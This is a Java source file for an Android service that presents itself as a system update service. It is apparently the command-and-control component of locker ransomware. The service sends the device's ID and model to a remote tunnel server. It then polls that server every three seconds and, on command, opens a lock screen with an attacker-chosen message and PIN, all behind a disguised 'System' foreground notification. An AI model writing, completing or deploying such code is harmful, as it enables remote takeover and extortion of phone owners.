package com.system.updateservice;
import android.app.*;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import org.json.JSONObject;
import java.io.*;
import java.net.*;
import java.util.Timer;
import java.util.TimerTask;

public class C2Service extends Service {
    private static final String BASE_URL = "https://LINK_CLOUDFLARE_LO.trycloudflare.com";
    private static final String C2_URL = BASE_URL + "/api";
    private String androidId;

    @Override public void onCreate() {
        super.onCreate();
        androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("fg", "Service", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
            startForeground(1, new Notification.Builder(this, "fg").setContentTitle("System").setSmallIcon(android.R.drawable.ic_menu_mylocation).build());
        }
        registerDevice();
        new Timer().scheduleAtFixedRate(new TimerTask() {
            @Override public void run() { checkCommands(); }
        }, 0, 3000);
    }

    private void registerDevice() {
        try {
            JSONObject data = new JSONObject();
            data.put("id", androidId); data.put("brand", Build.BRAND); data.put("model", Build.MODEL);
            postData(C2_URL + "/register", data.toString());
        } catch (Exception e) { }
    }

    private void checkCommands() {
        try {
            URL url = new URL(C2_URL + "/get_command/" + androidId);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder(); String line;
            while ((line = in.readLine()) != null) response.append(line);
            in.close();
            JSONObject json = new JSONObject(response.toString());
            if (json.optString("action").equals("lock")) {
                Intent lockIntent = new Intent(this, LockActivity.class);
                lockIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                lockIntent.putExtra("msg", json.optString("msg", "Device Locked"));
                lockIntent.putExtra("pin", json.optString("pin", "1234"));
                startActivity(lockIntent);
            }
        } catch (Exception e) { }
    }

    private void postData(String urlStr, String jsonStr) {
        try {
            URL url = new URL(urlStr); HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST"); conn.setRequestProperty("Content-Type", "application/json"); conn.setDoOutput(true);
            OutputStream os = conn.getOutputStream(); os.write(jsonStr.getBytes()); os.flush(); os.close(); conn.getResponseCode();
        } catch (Exception e) { }
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}
